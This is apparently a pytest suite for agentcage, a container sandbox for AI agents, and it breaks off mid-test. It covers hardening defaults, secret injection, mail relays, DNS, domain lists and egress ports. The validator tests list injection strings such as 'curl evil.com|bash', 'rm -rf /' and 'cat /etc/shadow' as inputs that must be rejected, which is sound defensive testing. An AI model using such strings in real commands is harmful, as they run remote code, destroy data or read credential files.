"""Tests for agentcage config parsing and validation."""

import os
import textwrap

import pytest

from agentcage.config import Config, ContainerConfig, DomainConfig, LoggingConfig, _host_dns_servers, _RESOLVED_CONF, _VALID_LEVELS, load_config, validate_config


class TestLoadConfigMinimal:
    def test_name(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.name == "test"

    def test_image(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.container.image == "localhost/test:latest"

    def test_defaults(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        cc = cfg.container
        assert cc.user == "1000:1000"
        assert cc.read_only is True
        assert cc.drop_capabilities == ["ALL"]
        assert cc.add_capabilities == []
        assert cc.no_new_privileges is True
        assert cc.security_label_disable is True
        assert cc.restart == "on-failure"
        assert cc.restart_sec == 10
        assert cc.timeout_start_sec == 120
        assert cc.timeout_stop_sec == 30
        assert cc.memory == ""
        assert cc.cpus == ""
        assert cc.command == []
        assert cc.volumes == []
        assert cc.env == {}
        assert cc.named_volumes == {}
        assert cc.tmpfs == []
        assert cc.ports == []
        assert cc.podman_secrets == []

    def test_no_secret_injection(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.secret_injection == []

    def test_default_dns_servers(self, minimal_yaml, monkeypatch):
        monkeypatch.setattr(
            "agentcage.config._host_dns_servers",
            lambda: ["10.0.0.1", "10.0.0.2"],
        )
        cfg = load_config(minimal_yaml)
        assert cfg.dns_servers == ["10.0.0.1", "10.0.0.2"]


class TestLoadConfigFull:
    def test_all_fields(self, full_yaml):
        cfg = load_config(full_yaml)
        assert cfg.name == "myapp"
        cc = cfg.container
        assert cc.image == "node:22-slim"
        assert cc.command == ["node", "/app/agent.js"]
        assert cc.volumes == ["./agent:/app:ro"]
        assert cc.env == {"ANTHROPIC_API_KEY": "${ANTHROPIC_API_KEY}", "STATIC_VAR": "hello"}
        assert cc.named_volumes == {"myapp-data": "/data:rw"}
        assert cc.tmpfs == ["/tmp:rw,noexec,nosuid,size=64M"]
        assert cc.ports == ["127.0.0.1:3000:3000"]
        assert cc.user == ""
        assert cc.memory == "4g"
        assert cc.cpus == "2.0"
        assert cc.read_only is False
        assert cc.drop_capabilities == []
        assert cc.add_capabilities == ["NET_BIND_SERVICE"]
        assert cc.no_new_privileges is False
        assert cc.security_label_disable is False
        assert cc.restart == "no"
        assert cc.restart_sec == 0
        assert cc.timeout_start_sec == 300
        assert cc.timeout_stop_sec == 60

    def test_secret_injection(self, full_yaml):
        cfg = load_config(full_yaml)
        assert len(cfg.secret_injection) == 1
        rule = cfg.secret_injection[0]
        assert rule.env == "INJECTED_KEY"
        assert rule.placeholder == "{{INJECTED_KEY}}"
        assert rule.inject_to == ["api.example.com"]

    def test_injected_secret_removed_from_podman_secrets(self, full_yaml):
        cfg = load_config(full_yaml)
        assert "INJECTED_KEY" not in cfg.container.podman_secrets
        assert "MY_API_KEY" in cfg.container.podman_secrets

    def test_dns_servers(self, full_yaml):
        cfg = load_config(full_yaml)
        assert cfg.dns_servers == ["100.100.100.100", "1.1.1.1"]


class TestLoadConfigSecretInjectionFormats:
    def test_list_format(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secret_injection:
              - env: KEY1
                placeholder: "{{KEY1}}"
        """))
        cfg = load_config(str(p))
        assert len(cfg.secret_injection) == 1
        assert cfg.secret_injection[0].env == "KEY1"

    def test_dict_with_rules_format(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secret_injection:
              rules:
                - env: KEY1
                  placeholder: "{{KEY1}}"
                - env: KEY2
                  placeholder: "{{KEY2}}"
                  inject_to:
                    - example.com
        """))
        cfg = load_config(str(p))
        assert len(cfg.secret_injection) == 2
        assert cfg.secret_injection[1].inject_to == ["example.com"]


class TestLoadConfigSecretsScope:
    def test_default_scope_is_auto(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
        """))
        cfg = load_config(str(p))
        assert cfg.secrets.scope == "auto"

    def test_explicit_user_scope(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secrets:
              scope: user
        """))
        cfg = load_config(str(p))
        assert cfg.secrets.scope == "user"

    def test_explicit_system_scope(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secrets:
              scope: system
        """))
        cfg = load_config(str(p))
        assert cfg.secrets.scope == "system"

    def test_invalid_scope_raises(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secrets:
              scope: bogus
        """))
        with pytest.raises(ValueError, match="invalid secrets.scope"):
            load_config(str(p))


class TestProtocolRelaysParser:
    def _yaml(self, tmp_path, body):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent(f"""\
            name: test
            container:
              image: test:latest
              podman_secrets:
                - MIGADU_USER
                - MIGADU_PASSWORD
              env:
                MIGADU_PASSWORD: "${{MIGADU_PASSWORD}}"
            {body}
        """))
        return p

    def test_parses_minimal_imap_relay(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: migadu-imap
                type: imap
                listen: "10.89.0.11:1143"
                upstream:
                  host: imap.migadu.com
                  port: 993
                  tls: true
                auth:
                  type: imap-login
                  user_source: "systemd-creds:MIGADU_USER"
                  password_source: "systemd-creds:MIGADU_PASSWORD"
                policy:
                  readonly: true
                  folder_allowlist: [INBOX, Sent]
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        assert len(cfg.protocol_relays) == 1
        relay = cfg.protocol_relays[0]
        assert relay.name == "migadu-imap"
        assert relay.type == "imap"
        assert relay.listen == "10.89.0.11:1143"
        assert relay.upstream.host == "imap.migadu.com"
        assert relay.upstream.port == 993
        assert relay.upstream.tls is True
        assert relay.auth.user_source == "systemd-creds:MIGADU_USER"
        assert relay.auth.password_source == "systemd-creds:MIGADU_PASSWORD"
        assert relay.policy.readonly is True
        assert relay.policy.folder_allowlist == ["INBOX", "Sent"]
        assert relay.policy.conn_rate_limit == "30/min"

    def test_strips_relay_secrets_from_podman_and_env(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: migadu-imap
                type: imap
                listen: "127.0.0.1:1143"
                upstream:
                  host: imap.migadu.com
                  port: 993
                auth:
                  type: imap-login
                  user_source: "systemd-creds:MIGADU_USER"
                  password_source: "systemd-creds:MIGADU_PASSWORD"
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        # Both names must be removed from podman_secrets and env so the
        # cage container never gets the credentials.
        assert "MIGADU_USER" not in cfg.container.podman_secrets
        assert "MIGADU_PASSWORD" not in cfg.container.podman_secrets
        assert "MIGADU_PASSWORD" not in cfg.container.env

    def test_unknown_type_raises(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: bogus
                type: not-a-protocol
                listen: "127.0.0.1:1234"
                upstream:
                  host: example.com
                  port: 1234
        """).replace("\n", "\n            "))
        with pytest.raises(ValueError, match="unknown protocol_relays type"):
            load_config(str(p))

    def test_missing_required_fields_raises(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - type: imap
                listen: "127.0.0.1:1234"
        """).replace("\n", "\n            "))
        with pytest.raises(ValueError, match="requires name/type/listen"):
            load_config(str(p))

    def test_invalid_upstream_port_raises(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: r
                type: imap
                listen: "127.0.0.1:1234"
                upstream:
                  host: example.com
                  port: 0
        """).replace("\n", "\n            "))
        with pytest.raises(ValueError, match="upstream requires"):
            load_config(str(p))

    def test_default_policy(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: r
                type: imap
                listen: "127.0.0.1:1234"
                upstream:
                  host: example.com
                  port: 993
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        relay = cfg.protocol_relays[0]
        assert relay.policy.readonly is False
        assert relay.policy.folder_allowlist == []
        assert relay.policy.conn_rate_limit == "30/min"

    def test_smtp_relay_parses(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: migadu-smtp
                type: smtp
                listen: "0.0.0.0:1025"
                upstream:
                  host: smtp.migadu.com
                  port: 465
                  tls: true
                auth:
                  type: smtp-plain
                  user_source: "podman:MIGADU_USER"
                  password_source: "podman:MIGADU_PASSWORD"
                policy:
                  sender_allowlist: ["agent@example.com"]
                  recipient_allowlist:
                    addresses: ["friend@example.com"]
                    domains: ["example.com"]
                  max_message_bytes: 1048576
                  max_recipients: 5
                  send_rate_limit: "10/hour"
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        relay = cfg.protocol_relays[0]
        assert relay.name == "migadu-smtp"
        assert relay.type == "smtp"
        assert relay.upstream.port == 465
        assert relay.policy.sender_allowlist == ["agent@example.com"]
        assert relay.policy.recipient_allowlist.addresses == ["friend@example.com"]
        assert relay.policy.recipient_allowlist.domains == ["example.com"]
        assert relay.policy.max_message_bytes == 1048576
        assert relay.policy.max_recipients == 5
        assert relay.policy.send_rate_limit == "10/hour"

    def test_smtp_recipient_allowlist_shorthand_list_means_addresses(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: r
                type: smtp
                listen: "127.0.0.1:1025"
                upstream:
                  host: smtp.example.com
                  port: 465
                auth:
                  type: smtp-plain
                  user_source: "podman:U"
                  password_source: "podman:P"
                policy:
                  recipient_allowlist:
                    - bob@example.com
                    - alice@example.com
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        relay = cfg.protocol_relays[0]
        assert relay.policy.recipient_allowlist.addresses == [
            "bob@example.com", "alice@example.com"
        ]

    def test_smtp_default_bypass_inspectors(self, tmp_path):
        """Default bypass list when the field is omitted is
        ['secrets', 'entropy', 'content-type'] — the three inspectors
        most likely to false-positive on legitimate human email
        content (forwarded keys, base64 attachments, PGP signatures
        in text/plain, long URLs)."""
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: r
                type: smtp
                listen: "127.0.0.1:1025"
                upstream:
                  host: smtp.example.com
                  port: 465
                auth:
                  type: smtp-plain
                  user_source: "podman:U"
                  password_source: "podman:P"
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        relay = cfg.protocol_relays[0]
        assert relay.policy.bypass_inspectors_for_allowlisted == [
            "secrets", "entropy", "content-type"
        ]

    def test_smtp_explicit_empty_bypass(self, tmp_path):
        """`bypass_inspectors_for_allowlisted: []` means strict mode:
        inspectors run even for allowlisted recipients."""
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: r
                type: smtp
                listen: "127.0.0.1:1025"
                upstream:
                  host: smtp.example.com
                  port: 465
                auth:
                  type: smtp-plain
                  user_source: "podman:U"
                  password_source: "podman:P"
                policy:
                  bypass_inspectors_for_allowlisted: []
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        relay = cfg.protocol_relays[0]
        assert relay.policy.bypass_inspectors_for_allowlisted == []

    def test_smtp_strips_relay_secrets_from_cage(self, tmp_path):
        """Same name-stripping behavior we proved for IMAP — secrets
        named in `auth.*_source` are removed from the cage's
        podman_secrets/env so only the proxy holds them."""
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: smtp1
                type: smtp
                listen: "127.0.0.1:1025"
                upstream:
                  host: smtp.example.com
                  port: 465
                auth:
                  type: smtp-plain
                  user_source: "podman:MIGADU_USER"
                  password_source: "podman:MIGADU_PASSWORD"
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        assert "MIGADU_USER" not in cfg.container.podman_secrets
        assert "MIGADU_PASSWORD" not in cfg.container.podman_secrets


class TestLoadConfigOpenclaw:
    def test_openclaw_config(self, openclaw_yaml):
        cfg = load_config(openclaw_yaml)
        assert cfg.name == "openclaw"
        assert cfg.container.image == "ghcr.io/openclaw/openclaw:latest"
        assert cfg.container.command == ["/usr/local/bin/entrypoint.sh"]
        assert cfg.container.memory == "4g"
        assert cfg.container.cpus == "2.0"
        assert len(cfg.secret_injection) == 1
        assert cfg.secret_injection[0].env == "ANTHROPIC_API_KEY"
        # ANTHROPIC_API_KEY is in secret_injection, not podman_secrets
        assert "ANTHROPIC_API_KEY" not in cfg.container.podman_secrets

    def test_openclaw_podman_secrets_preserved(self, openclaw_yaml):
        cfg = load_config(openclaw_yaml)
        assert "OPENCLAW_GATEWAY_TOKEN" not in cfg.container.podman_secrets
        assert "OPENCLAW_GATEWAY_PASSWORD" in cfg.container.podman_secrets


class TestLoggingConfig:
    def test_defaults_all_false(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.logging.dns_queries is False
        assert cfg.logging.proxy_connections is False
        assert cfg.logging.allowed_requests is False

    def test_explicit_true(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              dns_queries: true
              proxy_connections: true
              allowed_requests: true
        """))
        cfg = load_config(str(p))
        assert cfg.logging.dns_queries is True
        assert cfg.logging.proxy_connections is True
        assert cfg.logging.allowed_requests is True

    def test_legacy_log_allowed_compat(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            log_allowed: true
        """))
        cfg = load_config(str(p))
        assert cfg.logging.allowed_requests is True

    def test_new_key_overrides_legacy(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            log_allowed: true
            logging:
              allowed_requests: false
        """))
        cfg = load_config(str(p))
        assert cfg.logging.allowed_requests is False

    def test_level_default(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.logging.level == "info"
        assert cfg.logging.dns == ""
        assert cfg.logging.proxy == ""
        assert cfg.logging.cage == ""

    def test_level_explicit(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              level: warning
              dns: error
              proxy: debug
        """))
        cfg = load_config(str(p))
        assert cfg.logging.level == "warning"
        assert cfg.logging.dns == "error"
        assert cfg.logging.proxy == "debug"
        assert cfg.logging.cage == ""

    def test_level_for_fallback(self):
        lc = LoggingConfig(level="warning", dns="error")
        assert lc.level_for("dns") == "error"
        assert lc.level_for("proxy") == "warning"
        assert lc.level_for("cage") == "warning"

    def test_level_for_all_set(self):
        lc = LoggingConfig(level="info", dns="debug", proxy="warning", cage="error")
        assert lc.level_for("dns") == "debug"
        assert lc.level_for("proxy") == "warning"
        assert lc.level_for("cage") == "error"


class TestValidateLoggingLevels:
    def test_invalid_global_level(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              level: trace
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="logging.level"):
            validate_config(cfg)

    def test_invalid_service_level(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              dns: verbose
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="logging.dns"):
            validate_config(cfg)

    def test_valid_levels_pass(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              level: debug
              dns: warning
              proxy: error
              cage: info
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert warnings == []


class TestLoadConfigEdgeCases:
    def test_empty_file(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("")
        cfg = load_config(str(p))
        assert cfg.name == ""

    def test_drop_capabilities_string(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              drop_capabilities: NET_RAW
        """))
        cfg = load_config(str(p))
        assert cfg.container.drop_capabilities == ["NET_RAW"]

    def test_invalid_yaml_raises_valueerror_not_traceback(self, tmp_path):
        """Malformed cage.yaml must surface as ValueError with file:line:col,
        not a raw yaml.scanner.ScannerError Python traceback. The CLI
        catches ValueError and prints a clean `error: ...` message; a
        raw ScannerError would dump a 20-line stack trace at the user
        (the failure mode operators hit in the torture-session-findings
        PR before the fix)."""
        import pytest
        p = tmp_path / "broken.yaml"
        p.write_text("this: is: not: valid: yaml:")
        with pytest.raises(ValueError) as excinfo:
            load_config(str(p))
        msg = str(excinfo.value)
        assert "broken.yaml" in msg
        assert "is not valid YAML" in msg
        # Location info (line N, column N) must be embedded so the user
        # knows where to look — yaml.YAMLError exposes problem_mark.
        assert "line" in msg and "column" in msg

    def test_unreadable_file_raises_valueerror(self, tmp_path):
        """Same friendly-error contract for OSError (missing file,
        permission denied, etc.)."""
        import pytest
        missing = tmp_path / "does-not-exist.yaml"
        with pytest.raises(ValueError) as excinfo:
            load_config(str(missing))
        assert "could not read" in str(excinfo.value)
        assert str(missing) in str(excinfo.value)


class TestValidateConfig:
    def test_valid_config(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        warnings = validate_config(cfg)
        assert warnings == []

    def test_missing_name(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("container:\n  image: test:latest\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="name"):
            validate_config(cfg)

    @pytest.mark.parametrize("bad_name", [
        "foo; curl evil.com|bash",
        "foo$(id)",
        "foo`id`",
        "Uppercase",
        "-starts-with-dash",
        "has spaces",
        "has_underscores",
        "a" * 64,  # too long
    ])
    def test_rejects_invalid_name(self, tmp_path, bad_name):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: '{bad_name}'\ncontainer:\n  image: x\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="name"):
            validate_config(cfg)

    @pytest.mark.parametrize("good_name", [
        "myapp",
        "my-app",
        "a",
        "test123",
        "a" * 63,
    ])
    def test_accepts_valid_name(self, tmp_path, good_name):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: '{good_name}'\ncontainer:\n  image: x\n")
        cfg = load_config(str(p))
        validate_config(cfg)  # should not raise

    def test_missing_image(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("name: test\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="image"):
            validate_config(cfg)

    @pytest.mark.parametrize("good_image", [
        "ubuntu:24.04",
        "docker.io/library/ubuntu:latest",
        "ghcr.io/org/repo:tag",
        "registry.example.com:5000/path/image",
        "localhost/test:latest",
        "node:22-slim",
        "myimage",
        "my-repo/my-image:v1.2.3",
        "registry.example.com:5000/path/image@sha256:" + "a" * 64,
    ])
    def test_accepts_valid_image(self, tmp_path, good_image):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: test\ncontainer:\n  image: '{good_image}'\n")
        cfg = load_config(str(p))
        validate_config(cfg)  # should not raise

    @pytest.mark.parametrize("bad_image", [
        "ubuntu latest",          # whitespace
        "image;rm -rf /",         # shell metacharacter
        "image$(id)",             # command substitution
        "image`id`",              # backtick injection
        "../../../etc/passwd",    # path traversal (starts with .)
        "image|cat /etc/shadow",  # pipe injection
        "image&bg",               # background operator
        " leading-space",         # leading whitespace
    ])
    def test_rejects_invalid_image(self, tmp_path, bad_image):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: test\ncontainer:\n  image: '{bad_image}'\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="invalid container image reference"):
            validate_config(cfg)

    def test_warns_unset_env_var(self, tmp_path, monkeypatch):
        monkeypatch.delenv("NONEXISTENT_VAR_12345", raising=False)
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              env:
                MY_KEY: "${NONEXISTENT_VAR_12345}"
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert any("NONEXISTENT_VAR_12345" in w for w in warnings)

    def test_no_warn_for_set_env_var(self, tmp_path, monkeypatch):
        monkeypatch.setenv("EXISTING_VAR_TEST", "value")
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              env:
                MY_KEY: "${EXISTING_VAR_TEST}"
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert warnings == []


class TestHostDnsServers:
    def _patch_resolv(self, monkeypatch, tmp_path, etc_text, resolved_text=None):
        """Mock /etc/resolv.conf and optionally _RESOLVED_CONF."""
        etc_file = tmp_path / "etc-resolv.conf"
        etc_file.write_text(etc_text)
        resolved_file = None
        if resolved_text is not None:
            resolved_file = tmp_path / "resolved-resolv.conf"
            resolved_file.write_text(resolved_text)
        _real_open = open

        def _fake_open(path, *a, **kw):
            if path == "/etc/resolv.conf":
                return _real_open(str(etc_file), *a, **kw)
            if path == _RESOLVED_CONF and resolved_file is not None:
                return _real_open(str(resolved_file), *a, **kw)
            if path == _RESOLVED_CONF:
                raise OSError("No such file")
            return _real_open(path, *a, **kw)

        monkeypatch.setattr("builtins.open", _fake_open)

    def test_parses_resolv_conf(self, tmp_path, monkeypatch):
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="# comment\nnameserver 100.100.100.100\nnameserver 1.1.1.1\nsearch local\n",
        )
        assert _host_dns_servers() == ["100.100.100.100", "1.1.1.1"]

    def test_empty_resolv_conf_raises(self, tmp_path, monkeypatch):
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="# no nameservers here\nsearch local\n",
        )
        with pytest.raises(RuntimeError, match="Could not detect usable DNS"):
            _host_dns_servers()

    def test_missing_resolv_conf_raises(self, tmp_path, monkeypatch):
        _real_open = open
        def _fake_open(path, *a, **kw):
            if path in ("/etc/resolv.conf", _RESOLVED_CONF):
                raise OSError("No such file")
            return _real_open(path, *a, **kw)
        monkeypatch.setattr("builtins.open", _fake_open)
        with pytest.raises(RuntimeError, match="Could not detect usable DNS"):
            _host_dns_servers()

    def test_systemd_resolved_uses_upstream(self, tmp_path, monkeypatch):
        """When /etc/resolv.conf has only 127.0.0.53, read real upstreams."""
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="nameserver 127.0.0.53\noptions edns0\n",
            resolved_text="nameserver 192.168.1.1\n",
        )
        assert _host_dns_servers() == ["192.168.1.1"]

    def test_loopback_no_resolved_raises(self, tmp_path, monkeypatch):
        """All loopback + no systemd-resolved file → error."""
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="nameserver 127.0.0.53\noptions edns0\n",
        )
        with pytest.raises(RuntimeError, match="Set dns_servers explicitly"):
            _host_dns_servers()

    def test_filters_loopback_keeps_real_servers(self, tmp_path, monkeypatch):
        """Loopback entries are dropped but real servers are kept."""
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text=(
                "nameserver 127.0.0.1\n"
                "nameserver 9.9.9.9\n"
                "nameserver 127.0.0.53\n"
                "nameserver 8.8.4.4\n"
            ),
        )
        assert _host_dns_servers() == ["9.9.9.9", "8.8.4.4"]

    def test_filters_ipv6_loopback(self, tmp_path, monkeypatch):
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="nameserver ::1\n",
        )
        with pytest.raises(RuntimeError, match="Could not detect usable DNS"):
            _host_dns_servers()


class TestDomainConfigNewFormat:
    def test_allow_list(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - github.com
                - pypi.org
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == "allowlist"
        assert cfg.domains.allow == ["github.com", "pypi.org"]
        assert cfg.domains.list == ["github.com", "pypi.org"]
        assert cfg.domains.block == []
        assert cfg.domains.passthrough == []

    def test_block_list(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              block:
                - evil.com
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == "blocklist"
        assert cfg.domains.block == ["evil.com"]
        assert cfg.domains.list == ["evil.com"]
        assert cfg.domains.allow == []

    def test_passthrough(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - anthropic.com
                - whatsapp.com
              passthrough:
                - whatsapp.com
        """))
        cfg = load_config(str(p))
        assert cfg.domains.passthrough == ["whatsapp.com"]
        assert cfg.domains.allow == ["anthropic.com", "whatsapp.com"]
        assert cfg.domains.mode == "allowlist"

    def test_passthrough_default_empty(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.domains.passthrough == []

    def test_backward_compat_mode_allowlist(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              mode: allowlist
              list:
                - github.com
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == "allowlist"
        assert cfg.domains.allow == ["github.com"]
        assert cfg.domains.list == ["github.com"]

    def test_backward_compat_mode_blocklist(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              mode: blocklist
              list:
                - evil.com
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == "blocklist"
        assert cfg.domains.block == ["evil.com"]
        assert cfg.domains.list == ["evil.com"]

    def test_no_domains_section(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == ""
        assert cfg.domains.allow == []
        assert cfg.domains.block == []
        assert cfg.domains.passthrough == []
        assert cfg.domains.list == []

    def test_validation_allow_and_block_error(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - good.com
              block:
                - bad.com
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="cannot specify both"):
            validate_config(cfg)

    def test_validation_passthrough_warning(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - anthropic.com
              passthrough:
                - whatsapp.com
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert any("passthrough bypasses TLS" in w for w in warnings)
        assert any("whatsapp.com" in w and "not in the allow list" in w for w in warnings)

    def test_validation_passthrough_covered(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - anthropic.com
                - whatsapp.com
              passthrough:
                - whatsapp.com
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        # Should warn about passthrough but NOT about uncovered domain
        assert any("passthrough bypasses TLS" in w for w in warnings)
        assert not any("not in the allow list" in w for w in warnings)


class TestPortsConfig:
    """ports.tcp.{allow,passthrough} + ports.udp.allow split egress port
    policy by protocol. Layered on a default-deny filter:FORWARD policy.

    - tcp.allow / tcp.passthrough mirror domains.allow / domains.passthrough.
      Inspected TCP = tcp.allow - tcp.passthrough → nat:PREROUTING REDIRECT
      to mitmdump. Passthrough TCP → filter:FORWARD ACCEPT (uninspected).
    - udp.allow → filter:FORWARD ACCEPT (UDP is never inspected; mitmdump
      is HTTP-only). Defaults empty so QUIC/HTTP3 (UDP/443) and NTP (UDP/123)
      need explicit opt-in.

    Reserved-port checks (8080, 8443, protocol_relays listen, container.ports
    inbound forwards) apply to the inspected TCP set only.
    """

    # --- defaults and shape -----------------------------------------------

    def test_default_tcp_allow_is_http_https(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.ports.tcp.allow == [80, 443]

    def test_default_tcp_passthrough_is_empty(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.ports.tcp.passthrough == []

    def test_default_udp_allow_is_empty(self, minimal_yaml):
        """UDP is opt-in. Nothing forwarded by default — operators must
        list NTP, QUIC, etc. explicitly. Default-deny FORWARD drops the
        rest."""
        cfg = load_config(minimal_yaml)
        assert cfg.ports.udp.allow == []

    def test_custom_tcp_allow(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 443, 8448]
        """))
        cfg = load_config(str(p))
        assert cfg.ports.tcp.allow == [80, 443, 8448]
        validate_config(cfg)

    def test_custom_tcp_passthrough(self, tmp_path):
        """Operators list non-HTTP TCP services explicitly (Postgres,
        IMAP, custom). Forwarded without inspection."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              tcp:
                allow: [80, 443, 5432, 993]
                passthrough: [5432, 993]
        """))
        cfg = load_config(str(p))
        assert cfg.ports.tcp.allow == [80, 443, 5432, 993]
        assert cfg.ports.tcp.passthrough == [5432, 993]
        validate_config(cfg)

    def test_custom_udp_allow(self, tmp_path):
        """UDP requires explicit opt-in: NTP (123), QUIC/HTTP3 (443)."""
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            ports:
              udp:
                allow: [123, 443]
        """))
        cfg = load_config(str(p))
        assert cfg.ports.udp.allow == [123, 443]
        validate_config(cfg)

    def test_quic_alongside_tcp_inspection(self, tmp_path):
        """The headline use case: TCP/443 inspected (HTTP/2 audited)
        AND UDP/443 allowed uninspected (HTTP/3 reachable). The two
